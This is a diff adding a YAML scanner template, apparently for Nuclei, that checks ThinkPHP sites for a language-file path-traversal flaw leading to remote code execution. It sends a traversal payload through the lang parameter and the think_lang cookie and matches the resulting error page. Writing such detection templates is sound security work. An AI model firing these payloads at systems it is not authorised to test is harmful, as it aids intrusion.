@@ -1,0 +1,31 @@
+id: thinkphp-lang-rce
+info:
+  name: Thinkphp Lang - 远程代码执行漏洞
+  author: yt
+  severity: high
+  reference:
+    - https://tttang.com/archive/1865/
+  metadata:
+    verified: true
+    max-request: 2
+    vendor: thinkphp
+    product: lang
+  tags: rce,vuln,thinkphp,lang
+flow: http(1) || http(2)
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/?lang=../../../../../../public/index'
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 500 && contains(body, "is_file()") && contains(body, "src/lang")'
+  - method: GET
+    path:
+      - '{{BaseURL}}'
+    headers:
+      Cookie: think_lang=../../../../../../public/index
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 500 && contains(body, "is_file()") && contains(body, "src/lang")'
